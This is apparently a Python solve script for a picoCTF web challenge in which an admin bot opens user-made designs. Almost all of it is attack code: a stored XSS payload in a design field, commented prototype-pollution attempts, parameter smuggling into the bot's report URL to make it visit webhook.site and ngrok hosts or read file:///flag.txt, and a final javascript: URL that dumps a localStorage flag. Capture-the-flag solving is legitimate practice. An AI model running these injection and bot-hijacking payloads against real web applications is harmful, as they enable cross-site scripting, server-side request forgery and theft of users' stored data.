#!/usr/bin/env python3

import requests
from json import dumps as stringify
from time import sleep

HOST = 'http://0.0.0.0:8080'
# HOST = 'http://saturn.picoctf.net:51675'

def get_design(id: str):
    return requests.get(HOST + '/api/get', params={'id': id})

def get_reports():
    return requests.get(HOST + '/api/reports/get')

"""
Note that schema validates NAME while the share feature extracts TYPE.
"""
def create_design(payload: str):
    return requests.post(HOST + '/api/create', json=payload)

# activates bot
def report(id='abcdefghij'):
    """
    Make bot open a design with given ID.
    """
    return requests.get(HOST + f'/report', params={ 'id': id })

def report_raw(id):
    """
    Make bot open a design with given ID. No encoding applied
    """
    return requests.get(HOST + f'/report?id={id}')

"""
2 options:
1. Prepare a design which will display the flag once website is opened.
2. Prepare an id which will trigger RCE.
"""
# id='ngx.time()'
# # id='@https://webhook.site/0043b452-de19-44c5-9c08-155e5a9edadb'
# res=report(id)
# print(res.text)

# design = ([
#     {
#         "type": {
#             "toString": {
#                 "polluted": 1
#             }
#         },
#         "x": 0,
#         "y": 1,
#         "zIndex": 0
#     }
# ])
design = ([
    {
        "type": "<script>alert(1)</script>",
        "x": 0,
        "y": 1,
        "zIndex": 0
    }
])

for i in range(30):
    design.append({
        "type": "base",
        "x": i * 30,
        "y": 1,
        "zIndex": 0
    })

# print(design)

# res = create_design(design)
# print(res.text)

# payloads = [
#     "abcdefghij?id=http://google.com"
# ]

# res = report('%26url%3Dhttps%3A%2F%2Fwebhook.site%2F0043b452-de19-44c5-9c08-155e5a9edadb')
# res = report('%40webhook.site%2F0043b452-de19-44c5-9c08-155e5a9edadb')
# res = report('&test=!@#$%^&*()_+')
# res = report('&id=qxtbqqMFqU')
# res = report_raw(res.text)
# print(res.text)


# design = get_design('42t7Tz3Cs7')
# print(design.text)

# report_raw('anything;url=http://5c65-83-21-51-245.ngrok.io')
# report_raw('anything;url=file:///flag.txt')

# report_raw('anything;url=http://5c65-83-21-51-245.ngrok.io')
# report_raw('anything;url=http://7ff7-83-21-51-245.ngrok.io')
report_raw('anything;url=javascript%3Adocument.body.innerHTML%3Dwindow.localStorage.get("flag")')
